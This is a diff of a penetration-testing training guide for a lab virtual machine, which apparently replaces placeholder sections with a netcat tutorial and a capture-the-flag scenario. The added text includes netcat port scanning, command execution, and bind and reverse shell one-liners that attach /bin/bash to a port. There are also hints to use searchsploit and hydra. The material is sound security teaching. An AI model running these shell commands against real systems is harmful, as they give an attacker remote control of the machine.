@@ -203,61 +203,107 @@ nmap 192.168.56.102 -p 22 --script ssh-brute.nse -vv
 After a few moments the session will satrt and you will seee the various login attempts in the terminal.
 Once you are satisfied with what is going on, feel free to cancel the attack with `Ctl^ C` or wait until the end.
 
-### shells
-Todo - what is a shell
+## nc & Shells
+In OffSec we ofter refer to 'popping shells' on targets, but what do we mean by this? Popping a shell on a system is when we achieve remote code execution (RCE) on a target. There are many different types of shell, but ultimately in the game that is pen testing we only count it as a popped shell shell if we get interactive command line or terminal access. 
+Often RCE is achievable via an unsecured feature or a bonus function (CLIs anyone?!?) on a server. While you can do a lot of damage with RCE, nothing says pwnd like a fully interactive terminal. 
+There are dozens of tools and resources available on this subject, many of which we will be diving into in later dojos but for now we are going to consider netcat (nc) to demonstrate bind and reverse shells. 
+For these exercises open two terminals.
 
-#### bind shell
-Todo - make a call to a server
+NC allows you to arbitrarily open communication channels between two machines. It uses a similar sytax to nmap: `nmap <ip> <port>` but without the -p for connecting to target ports. 
 
-#### reverse shell
-Todo - make a call to the attacker
-
-### RCE on CDX machine
-We've played with a couple of tools as an introduction, but lets actually attack the system.
-Based on a standard nmap scan I can see port 80 is open on the victim machine.
+In a pinch you can use it as a port scanner with -z, -v keeps things verbose
 
 ```
-root@kali:~# nmap 192.168.56.102
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 17:00 EDT
-Nmap scan report for 192.168.56.102
-Host is up (0.00012s latency).
-Not shown: 996 closed ports
-PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
-139/tcp open  netbios-ssn
-445/tcp open  microsoft-ds
-MAC Address: 08:00:27:5A:B8:41 (Oracle VirtualBox virtual NIC)
-
-Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
+nc -zv 192.168.56.102 1-65535
 ```
-Port 80 by default serves up web content and by definition should be a good place to start looking for clues.
 
-You can curl the url to immediatley look at the code and look at injection points. Alternativley you can use tools like dirbuster to brute force a map of the site. To be honest I like to look at the website from the user perspective first to get a feel of the user experience of the site. Is there a login, a create a user or some public information I can gather from the site. Armed with this I can focus my attention on launching automated attacks later, once I've got an idea of what the user should be able to do.  
+You can pipe commands down it to interact with servers, this will get you headers.
 
-Using the browser I go to http://192.168.56.102 and am presented with a login page. Nice, pin that as a place to try injection attacks and brute force later. Looking at the source code there are a few items I might want to try later, but before I do I want to see what happens if I break the system.
+```
+echo -n "GET / HTTP/1.1\r\n\r\n" | nc 192.168.56.102 80
+```
 
-I put a random aplpha string into the url to see what happens, and look it breaks the app. With debug mode? Oh wow.
+Where nc really shines is in server mode. In server mode we can open a non servicename (-n) listening (-l) port (-p) in verbose (-v) mode with the following command:
 
-![http-scramble.png](images/dojo1/http-scramble.png)
+_terminal 1_
+```
+nc -nvlp 1337
+```
 
-From this I can tell the serve is using Django and where the url patterns are.
-After trying a few I can see they are not protected by a login and I can easily access pages I shouldn't see.
-After putting a few in the base url I get to http://192.168.56.102/vote/
+in a seperate terminal, we can connect to it:
 
-todo - php upload
-todo - reverse shell
-todo - pwn root
+_terminal 2_
+```
+nc -v 127.0.0.1 1337
+```
+You will see this connects, and you can send typed messages down either side. Give it a try.
 
+You can also pipe commands down a nc connection, set up a listener:
 
+_terminal 1_
+```
+nc -nvlp 1337
+```
+execute the command via the -e flag
 
+_terminal 2_
+```
+nc -v 127.0.0.1 1337 -e /usr/sbin/ifconfig
+```
+This works both ways, why not try it by attaching a command to the listener side?
+
+So this is pretty cool, you can also use nc and redirects to transfer files. Can you work out how?
+
+Probrably the most abused/dangerous feature of netcat is the ability to attach a bind or a reverse shell to a port. A bind shell is possibly the easiest to understand at first, this is where we attach a shell (bash) to a port and then connect to it. Much like standing up a server and connecting a client to it.
+
+We set up the listener with a bash shell
+
+_terminal 1 victim_
+```
+nc -nvlp 1337 -e /bin/bash
+```
+
+and then connect to it via
+
+_terminal 2 attacker_
+```
+nc -v 127.0.0.1 1337
+```
+note you can run commands from terminal 2, try some basic commands.
+
+A bind shell is useful, but has some drawbacks as it is easy to detect and stop with ingress firewalls.
+So how do we bypass this restriction? We make our connection look like egress traffic via a reverse shell.
+This time we make the victim connect to a listener on the attacking machine and send its bash terminal over the pipe.  
+
+this time we set a listener up on the attacker first
+
+_terminal 2 attacker_
+```
+nc -nvlp 1337 
+```
+
+next we execute bash down our client connection to the kali machine
+
+_terminal 1 victim_
+```
+nc -v 127.0.0.1 1337 -e /bin/bash
+```
+
+Because the victim initiated the connection, it looks like it is requesting access to a legitimate sevice on the attacker. when combined with encrypted tunnels this is a very powerful way to avoid network level security.
+
+This ends the tutorial component of the Dojo, next try and use these tools to attack the CDX box below.
+
+### The CDX machine
+As the red team for hire we've been been tasked by Sequelios to determine how they've lost access to their new voting system on the eve of their election. Any attempts they make to revert are quickly undone by an unkown assailant and they have lost control of the system. The Sequelios officials suspect foul play and have hired us to assess the system for weakness and try to regain control of the system before democracy fails!
+
+Can you use you new found skills to find the hacker's back door and make your way into the system?
 
 ### Some undocumented things to Try
 
 * nmap doesn't scan all ports by default, see if you can workout how to find any hidden services
 * you can auto pwn a sevice with a vulnerability stored on kali. Can you find it with searchsploit?
-* You have access to port 22 and know the login details for the system. Can you re-create an ssh login using hydra?
-* Documentation is import, nmap has some flags that allow for static file outputs. see if you can find one you like that isn't an output re-direct.
+* You have access to port 22 and know login details for the system. Can you re-create an ssh login using hydra?
+* Documentation is important, nmap has some flags that allow for static file outputs. See if you can find one you like that isn't an output re-direct.
 
 ## Additional Network Katas
 
